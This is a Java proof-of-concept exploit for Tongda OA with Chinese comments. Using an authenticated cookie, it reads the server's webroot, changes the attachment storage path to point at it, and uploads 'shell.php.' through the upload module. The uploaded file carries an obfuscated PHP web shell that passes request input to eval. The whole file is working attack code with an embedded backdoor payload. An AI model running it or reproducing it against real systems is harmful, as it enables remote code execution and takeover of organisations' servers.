package poc;

import com.alibaba.fastjson.JSON;
import com.github.kevinsawicki.http.HttpRequest;
import org.jsoup.Jsoup;

import java.util.Random;

public class TongdaOA_Module_Upload {
    private String url;//通达OA url地址
    private String path;//通达OA path目录地址
    private String cookie;//cookie
    private String webroot;//网站根目录
    private String fileName;//上传文件名
    private String payload="<?php class G6uUX6lU { public function __construct($H0Lp0){ @eval(\"/*Zq2m6k6oUg*/\".$H0Lp0.\"/*Zq2m6k6oUg*/\"); }}new G6uUX6lU($_REQUEST['x']);?>";//webshell内容

    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getPath() {
        return path;
    }

    public void setPath(String path) {
        this.path = path;
    }

    public String getCookie() {
        return cookie;
    }

    public void setCookie(String cookie) {
        this.cookie = cookie;
    }

    public String getWebroot() {
        return webroot;
    }

    public void setWebroot(String webroot) {
        this.webroot = webroot;
    }

    public String getFileName() {
        return fileName;
    }

    public void setFileName(String fileName) {
        this.fileName = fileName;
    }

    public String getPayload() {
        return payload;
    }

    public void setPayload(String payload) {
        this.payload = payload;
    }


    //POC
    public boolean POC() {
        //获取webroot
        path = "/general/system/security/service.php";
        HttpRequest webrootRequest = HttpRequest.get(url + path)
                .trustAllCerts()
                .trustAllHosts()
                .header("Cookie", cookie);
        webroot= Jsoup.parse(webrootRequest.body()).select("Input[name=\"WEBROOT\"]").attr("value").toUpperCase();

        //设置附件存储路径为webroot
        Random random = new Random();
        int POS_ID=random.nextInt(155)+100;
        path="/general/system/attachment/position/add.php";
        HttpRequest setRequest = HttpRequest.post(url + path)
                .trustAllHosts()
                .trustAllCerts()
                .header("Cookie", cookie)
                .send("POS_ID="+POS_ID+"&POS_NAME=upload&POS_PATH="+webroot+".&IS_ACTIVE=on");
        setRequest.body();

        //上传shell
        path="/module/upload/upload.php?encode=utf-8";
        HttpRequest fileRequest = HttpRequest.post(url + path)
                .trustAllCerts()
                .trustAllHosts()
                .header("Cookie", cookie)
                .part("file", "shell.php"+".", payload);
        if (fileRequest.code()==200){
            String id= JSON.parseObject(fileRequest.body()).get("id").toString();
            path="/upload_temp/"+id.split("@")[1].replace("_","/").replace(",",".")+"shell.php";
            return true;
        }else {
            return false;
        }
    }

}
